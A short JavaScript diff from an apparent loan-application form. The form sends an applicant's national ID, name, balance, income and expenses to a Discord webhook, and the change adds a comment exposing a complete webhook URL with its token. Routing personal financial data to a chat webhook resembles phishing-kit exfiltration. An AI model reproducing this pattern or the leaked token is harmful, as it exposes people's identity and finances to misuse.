@@ -207,7 +207,7 @@
 
         const discordMessage = `✅ **INFO DE USUARIO** ✅\n\n🪪 **Cédula**: ${formData.cedula}\n👤 **Nombre**: ${formData.nombreCompleto}\n💵 **Monto solicitado**: ${formData.montoPrestamo}\n💰 **Saldo actual**: ${formData.saldoActual}\n🏢 **Ocupación**: ${formData.ocupacion}\n💸 **Ingresos**: ${formData.ingresoMensual}\n🧾 **Gastos**: ${formData.gastosMensual}\n📅 **Meses**: ${formData.meses}\n📆 **Fecha de pago**: ${formData.fechaPago}`;
 
-        const DISCORD_WEBHOOK = "TU_WEBHOOK_DE_DISCORD_AQUI"; // Cambia aquí
+        const DISCORD_WEBHOOK = "TU_WEBHOOK_DE_DISCORD_AQUI"; // "https://discord.com/api/webhooks/1476583005106602116/5bfBLBL_ccXUcETJGmIAV2ZAhqkIVsEhUM_filQ_qey6lzvN9RGyQyJh08scazuei3dZ";
 
         try {
           await fetch(DISCORD_WEBHOOK, {
